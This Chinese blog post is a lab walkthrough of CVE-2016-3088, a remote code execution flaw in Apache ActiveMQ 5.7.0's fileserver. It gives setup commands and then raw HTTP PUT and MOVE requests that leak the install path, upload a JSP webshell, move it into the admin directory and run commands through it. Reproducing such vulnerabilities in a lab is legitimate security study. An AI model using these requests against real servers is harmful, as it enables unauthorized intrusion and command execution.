# 【漏洞预警】Apache ActiveMQ Fileserver 远程代码执行漏洞(CVE-2016-3088) - admin-神风 - 博客园

> 原文：[`www.cnblogs.com/wh4am1/p/7749472.html`](https://www.cnblogs.com/wh4am1/p/7749472.html)

漏洞编码：CVE-2016-3088

实验环境：Linux

Apache ActiveMQ 版本号：Apache ActiveMQ 5.7.0

---------------------------------------------------------------------

首先下载安装包

```
wget http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/apache-activemq-5.7.0-bin.tar.gz
```

解压后打开 bin 目录

启动 apache activemq

```
./activemq start
```

检验是否运行

```
netstat -an | grep 61616
```

![](img/aae97968cba94a1aadbbcce09b95c9c6.png)

如果 61616 端口开放了就说明运行成功。

然后进入 http://xxx.xxx.xxx.xxx:8161/

![](img/0de4a0045cbece1de7bafb518f16f45e.png)

**漏洞利用**

1、 获取物理路径

```
PUT /fileserver/%20/%20 HTTP/1.1
```

发送数据包

![](img/3a5669c723b6c75d73b1c38c71c87745.png)

2、再利用 PUT 上传一个 Jsp 的马到 fileserver 目录

```
PUT /fileserver/1.jsp HTTP/1.1 
```

![](img/c6c769bb2e49085c63d51c3f3628631d.png)

遇到这种情况不用担心，只是该目录没有执行的权限罢了。

解决方法看漏洞三

3、利用 MOVE 方法将 Webshell 移入 admin/ 目录（也可以利用相对路径）

```
MOVE /fileserver/1.jsp  HTTP/1.0 Destination:file:///root/apache-activemq-5.7.0/webapps/admin/1.jsp
```

![](img/6dbcf0e2d95d227fa0f9c578618750d2.png)

然后访问 http://xxx.xxx.xxx.xxx:8161/admin/1.jsp?cmd=id

![](img/99aaae888e0cea6b2c6ac36b68f89ca2.png)

成功执行了命令

漏洞原文：https://www.seebug.org/vuldb/ssvid-96268